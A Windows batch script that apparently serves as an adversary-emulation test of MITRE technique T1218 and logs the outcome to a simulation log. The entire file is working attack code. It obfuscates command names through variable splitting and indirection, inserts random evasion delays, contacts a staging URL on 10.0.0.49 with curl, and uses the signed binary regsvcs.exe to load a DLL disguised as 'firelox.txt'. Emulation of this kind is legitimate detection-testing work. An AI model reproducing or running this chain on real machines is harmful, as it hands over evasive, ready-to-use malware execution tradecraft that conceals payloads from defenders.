@echo off
SETLOCAL EnableDelayedExpansion

REM PHR_ constants (plain literals - NEVER obfuscated)
SET txisnba=!%APPDATA%\8018\fcc8fe2a!
SET mdvfmsbx=!https://10.0.0.49!
SET keghkgto=!https://10.0.0.49/stage/2/icon.png?8018-7!
SET jwcnifl=!ITZEL-S2BO!
SET rrocubc=!7!
SET xzanpex=!firelox.txt!
SET dvhhyc=!8018!

REM Debug log file
SET zhtuf=%APPDATA%\!rrocubc!\macula-simulations.log

REM Random variable indirection setup
SET kjdhd=cu
SET plqwa=rl
SET mklpo=!kjdhd!!plqwa!

SET ytrqw=reg
SET fghjk=svc
SET vbncx=s
SET lkjhg=e.exe
SET oiuyw=!ytrqw!!fghjk!!vbncx!!lkjhg!

SET nbmvc=%WINDIR%\System32
SET qazws=!nbmvc!\!oiuyw!

REM Initial random delay
SET /A zxcvb=%RANDOM% %% 30 + 30
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: Initial delay start for !zxcvb!s>>> "!zhtuf!" 2>nul
timeout /t !zxcvb! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: Initial delay complete>>> "!zhtuf!" 2>nul

REM Heartbeat check with obfuscated curl
SET part1=-k
SET part2=-s
SET part3=-o
SET part4=nul
SET flag1=!part1!
SET flag2=!part2!
SET flag3=!part3!
SET flag4=!part4!

echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: Heartbeat check start>>> "!zhtuf!" 2>nul
!mklpo! !flag1! !flag2! !flag3! !flag4! "!keghkgto!"
IF ERRORLEVEL 1 (
    SET hjklm=0
    SET poiuy=connection_failed
) ELSE (
    SET hjklm=1
    SET poiuy=
)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: Heartbeat check complete, result=!hjklm!>>> "!zhtuf!" 2>nul

REM Delay between operations
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: Ping delay start>>> "!zhtuf!" 2>nul
ping -n 7 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: Ping delay complete>>> "!zhtuf!" 2>nul

REM Change directory with indirection
SET varidx=0
SET "part[0]=cd"
SET "part[1]= /d"
SET "part[2]= "!txisnba!""

FOR /L %%i IN (0,1,2) DO (
    SET "tmp=!part[%%i]!"
    SET cdcmd!varidx!=!tmp!
    SET /A varidx+=1
)

SET chdir=!cdcmd0!!cdcmd1!!cdcmd2!
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: Changing directory to !txisnba!>>> "!zhtuf!" 2>nul
%chdir%
IF ERRORLEVEL 1 (
    SET qwert=0
    SET yuiop=chdir_failed
) ELSE (
    SET qwert=1
    SET yuiop=
)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: Directory change complete, result=!qwert!>>> "!zhtuf!" 2>nul

REM Random delay before execution
SET /A asdfg=%RANDOM% %% 15 + 10
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: Random delay !asdfg!s start>>> "!zhtuf!" 2>nul
CHOICE /C Y /N /D Y /T !asdfg! >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: Random delay complete>>> "!zhtuf!" 2>nul

REM DLL execution with variable indirection
SET cmdvar1=!qazws!
SET "cmdvar2=!xzanpex!"
SET refvar=cmdvar1

echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: Starting DLL execution>>> "!zhtuf!" 2>nul
for /f "delims=" %%a in ("!refvar!") do SET lolbinexe=!%%a!
!lolbinexe! "!cmdvar2!"
IF ERRORLEVEL 1 (
    SET ttp_res=0
    SET ttp_err=assembly_load_failed
) ELSE (
    SET ttp_res=1
    SET ttp_err=
)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: DLL execution complete, result=!ttp_res!>>> "!zhtuf!" 2>nul

REM TTP logging with formatted timestamp
for /f "tokens=2-4 delims=/ " %%a in ("!DATE!") do (
    SET month=%%a
    SET day=%%b
    SET year=%%c
)
SET logtime=!year!-!month!-!day! !TIME!

(echo [!logtime!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218^|Signed Binary Proxy Execution=!ttp_res!:!ttp_err!>> "!zhtuf!") 2>nul || rem

REM Final delay
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: Final delay start>>> "!zhtuf!" 2>nul
timeout /t 12 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: Final delay complete>>> "!zhtuf!" 2>nul

ENDLOCAL